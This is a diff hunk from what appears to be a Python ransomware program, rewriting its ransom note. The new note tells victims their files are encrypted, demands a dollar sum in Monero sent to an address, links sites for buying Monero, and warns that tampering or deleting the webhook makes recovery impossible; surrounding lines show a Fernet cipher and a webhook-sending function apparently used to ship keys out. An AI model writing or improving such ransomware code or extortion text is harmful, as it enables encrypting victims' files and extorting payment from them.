@@ -62,25 +62,33 @@ cipher_suite = Fernet(key)
 
 encryptedfiles = [] # Saves all encrypted files
 
-ransom_note = f"""YOUR FILES HAVE BEEN ENCRYPTED!
+ransom_note = f"""Your computer is now infected with ransomware. Your file are encrypted with a secure algorithm that is impossible to crack.
 
-Your personal ID: {user_id}
+To recover your files you need a key. This key is generated once your file have been encrypted. To obtain the key, you must purchase it.
 
-Do not try to decrypt your files yourself, it is impossible without the key. 
-The only way to get your files back is to pay the ransom.
-
-To get the decryption Program you need to pay ${cash} in monero to the address below:
-
+You can do this by sending ${cash} USD to this monero address:
 {monero_adr}
 
-Once you made the payment, you need to write a mail to this email with your personal ID.
+Don't know how to get monero? Here are some websites:
 
-Email: {email_adr}
+https://www.coinbase.com/how-to-buy/monero
+https://localmonero.co/?language=en
+https://www.okx.com/buy-xmr
 
-To the skids:
-By deleting our webhook you won't reach much. The only thing that will happen is that we don't get the recovery keys anymore.
+Once you have sent the ransom to the monero address you must write an email this this email address: {email_adr}
 
-DO NOT TRY ANYTHING STUPID!""" # Ransom note to display
+In this email you will include your personal ID so we know who you are. Your personal ID is: {user_id}
+
+Once you have completeted all of the steps, you will be provided with the key to decrypt your files.
+
+Don't know how ransomware works? Read up here:
+https://www.trellix.com/en-us/security-awareness/ransomware/what-is-ransomware.html
+https://www.checkpoint.com/cyber-hub/threat-prevention/ransomware/
+https://www.trendmicro.com/vinfo/us/security/definition/Ransomware
+
+Note: Messing with the ransomware will simply make your files harder to decrypt. Deleting the webhook will make it impossible, as the key can not be generated.
+
+Good luck"""
 
 def send_wh():
     data = {
